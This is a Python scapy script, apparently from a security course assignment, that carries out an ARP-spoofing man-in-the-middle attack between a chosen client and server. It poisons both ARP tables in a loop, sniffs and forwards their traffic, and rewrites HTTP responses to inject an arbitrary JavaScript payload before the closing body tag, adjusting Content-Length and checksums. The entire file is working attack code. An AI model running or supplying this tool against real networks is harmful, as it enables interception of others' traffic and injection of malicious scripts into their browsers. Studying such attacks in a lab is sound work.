# ref https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time
import base64

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    return getmacbyip(IP)

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) 
        spoof(clientIP, attackerMAC, serverIP, serverMAC) 
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    spoof_pkt = ARP(op=2, psrc=srcIP, pdst=dstIP, hwdst=dstMAC, hwsrc=srcMAC)
    send(spoof_pkt)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    restore_pkt = ARP(op=2, psrc=srcIP, pdst=dstIP, hwdst=dstMAC, hwsrc=srcMAC)
    send(restore_pkt) 
    send(restore_pkt) 
    send(restore_pkt) 
    send(restore_pkt) 

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script
    
    if packet.haslayer(IP):
        if packet[IP].dst == clientIP and packet[Ether].dst != clientMAC:
            if packet.haslayer(Raw):
                packet = modify_packet(packet)
            send(packet[IP])
        if packet[IP].dst == serverIP and packet[Ether].dst != serverMAC:

            send(packet[IP])

def modify_packet(packet):
    # ref: https://www.thepythoncode.com/article/injecting-code-to-html-in-a-network-scapy-python
    print("modify")
    try:
        load = packet[Raw].load.decode()
    except:
        return packet
    script_length = len(script)
    load = load.replace("</body>", script + "</body>")

    if "Content-Length" in load:
        content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
        new_content_length = content_length + script_length
        load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
    packet[Raw].load = load
    packet[IP].len = None
    packet[IP].chksum = None
    packet[TCP].chksum = None
    return packet

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    script = "<script>" + args.script + "</script>"

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
